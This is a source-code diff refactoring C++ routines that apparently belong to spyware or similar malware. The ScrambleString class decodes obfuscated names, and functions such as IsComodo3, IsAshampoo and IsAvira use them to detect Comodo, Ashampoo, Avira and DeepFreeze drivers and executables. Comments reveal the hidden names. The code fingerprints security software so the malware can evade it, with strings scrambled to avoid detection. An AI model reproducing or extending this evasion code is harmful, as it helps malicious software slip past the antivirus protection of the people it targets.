@@ -1,21 +1,28 @@
-class ScrambleString
+struct ScrambleString
 {
-	public:
-	char *get_str()
+	operator const char* ()
 	{
-		if (string)
-			return string;
-		return "NIL";
+		return (string != NULL) ? string : "NIL";
 	}
 
-	WCHAR *get_wstr()
+	operator const wchar_t* ()
 	{
 		return string_w;
 	}
 
-	ScrambleString(char *ob_str) 
+	char* get_str()
 	{
-		string = LOG_ScrambleName(ob_str, 2, FALSE);
+		return (string != NULL) ? string : "NIL";
+	}
+
+	wchar_t* get_wstr()
+	{
+		return string_w;
+	}
+
+	ScrambleString(const char *ob_str) 
+	{
+		string = LOG_ScrambleName((char *)ob_str, 2, FALSE);
 		if (string)
 			_snwprintf_s(string_w, 64, _TRUNCATE, L"%S", string);		
 		else
@@ -39,14 +46,14 @@ class ScrambleString
 	{
 		SAFE_FREE(string);
 	}
-	
-	private:
+
+
 	char *string;
 	WCHAR string_w[64];
 };
 
 
-BOOL IsDriverRunning(WCHAR *driver_name)
+BOOL IsDriverRunning(const WCHAR *driver_name)
 {
 	DWORD dummy;
 	LPVOID *drivers;
@@ -168,7 +175,7 @@ BOOL IsComodo3()
 	ZeroMemory(buffer, sizeof(buffer));
 	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
 	strcat(buffer, "\\system32\\drivers\\");
-	strcat(buffer, ss1.get_str());
+	strcat(buffer, ss1);
 
 	hff = FNC(FindFirstFileA)(buffer, &fdata);
 	if (hff == INVALID_HANDLE_VALUE)
@@ -178,7 +185,7 @@ BOOL IsComodo3()
 	ZeroMemory(buffer, sizeof(buffer));
 	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
 	strcat(buffer, "\\system32\\drivers\\");
-	strcat(buffer, ss2.get_str());
+	strcat(buffer, ss2);
 
 	hff = FNC(FindFirstFileA)(buffer, &fdata);
 	if (hff == INVALID_HANDLE_VALUE) 
@@ -198,13 +205,13 @@ BOOL IsAshampoo()
 	ScrambleString ss2("xPvU47Jj8tlrNd8ti.lVl"); // "AntiSpyWare2Guard.exe"
 	ScrambleString ss3("xPvU47Jj8tlr.lVl"); // "AntiSpyWare2.exe"
 
-	if (IsDriverRunning(ss1.get_wstr()))
+	if (IsDriverRunning(ss1))
 		return TRUE;
 
 	ZeroMemory(buffer, sizeof(buffer));
 	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
 	strcat(buffer, "\\system32\\");
-	strcat(buffer, ss1.get_str());
+	strcat(buffer, ss1);
 	
 	hff = FNC(FindFirstFileA)(buffer, &fdata);
 	if (hff != INVALID_HANDLE_VALUE) {
@@ -262,9 +269,9 @@ BOOL IsDeepFreeze()
 
 BOOL IsAvira()
 {
-	WIN32_FIND_DATA fdata;
-	char buffer[DLLNAMELEN];
-	HANDLE hff;
+	WIN32_FIND_DATA fdata = {};
+	char buffer[DLLNAMELEN] = {};
+	HANDLE hff = INVALID_HANDLE_VALUE;
 
 	ScrambleString ss1("8RCPvoCt.1J1"); // "avgntmgr.sys"
 	ScrambleString ss2("8RCPvii.1J1"); // "avgntdd.sys"
